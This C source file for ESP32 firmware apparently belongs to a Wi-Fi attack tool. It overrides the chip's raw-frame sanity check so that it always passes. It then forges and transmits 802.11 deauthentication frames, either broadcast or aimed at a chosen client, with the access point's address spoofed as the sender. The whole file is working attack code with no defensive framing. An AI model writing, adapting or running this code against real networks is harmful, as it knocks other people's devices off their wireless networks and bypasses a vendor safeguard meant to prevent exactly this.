
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

void wsl_bypasser_send_deauth_to_sta(const uint8_t *ap_bssid, const uint8_t *sta) {
    ESP_LOGD(TAG, "Sending deauth to STA %02X:%02X:%02X:%02X:%02X:%02X",
             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
    // Frame layout: use template but overwrite addr1/addr2/addr3
    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
    // addr1 (destination) = STA
    memcpy(&frame[4], sta, 6);
    // addr2 (source) = AP
    memcpy(&frame[10], ap_bssid, 6);
    // addr3 (BSSID) = AP
    memcpy(&frame[16], ap_bssid, 6);
    // reason code left as in template (0x02)
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}